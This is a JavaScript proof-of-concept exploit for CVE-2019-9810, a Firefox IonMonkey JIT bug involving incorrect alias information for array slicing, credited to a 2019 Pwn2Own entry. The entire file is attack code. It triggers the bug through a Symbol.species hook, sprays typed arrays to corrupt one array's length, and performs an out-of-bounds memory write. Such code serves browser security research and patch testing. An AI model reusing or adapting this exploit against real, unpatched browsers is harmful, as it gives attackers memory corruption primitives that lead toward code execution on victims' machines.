// Axel '0vercl0k' Souchet - 27 April 2019
// CVE-2019-9810 - IonMonkey MArraySlice incorrect alias information
// The issue has been found by Amat Cama and Richard Zhu for compromising Mozilla Firefox
// during Pwn2Own2019.
//

const Debug = true;
const dbg = p => {
    if(Debug == false) {
        return;
    }

    print('Debug: ' + p);
};

const ArraySize = 0x4;
const WantedArraySize = 0x42424242;

let arr = null;
let Trigger = false;
const Spray = [];

function f(Special, Idx, Value) {
    arr[Idx] = 0x41414141;
    Special.slice();
    arr[Idx] = Value;
}

class SoSpecial extends Array {
    static get [Symbol.species]() {
        return function() {
            if(!Trigger) {
                return;
            }

            arr.length = 0;
            for(let i = 0; i < 0x40000; i++) {
                Spray.push(new Uint32Array(ArraySize));
            }
        };
    }
};

function get_me_biggie() {
    for(let Idx = 0; Idx < 0x1000; Idx++) {
        Spray.push(new Uint32Array(ArraySize));
    }

    const SpecialSnowFlake = new SoSpecial();
    for(let Idx = 0; Idx < 10; Idx++) {
        arr = new Array(0x7e);
        Trigger = false;
        for(let Idx = 0; Idx < 0x400; Idx++) {
            f(SpecialSnowFlake, 0x70, Idx);
        }

        Trigger = true;
        f(SpecialSnowFlake, 47, WantedArraySize);
        if(arr.length != 0) {
            continue;
        }

        const Biggie = Spray.find(e => e.length != ArraySize);
        if(Biggie != null) {
            return Biggie;
        }
    }

    return null;
}

function main() {
    const Biggie = get_me_biggie();
    if(Biggie == null || Biggie.length != WantedArraySize) {
        dbg('Failed :-(.');
        return;
    }

    Biggie[0x11223344] = 0xaaaaaaaa;
}

main();

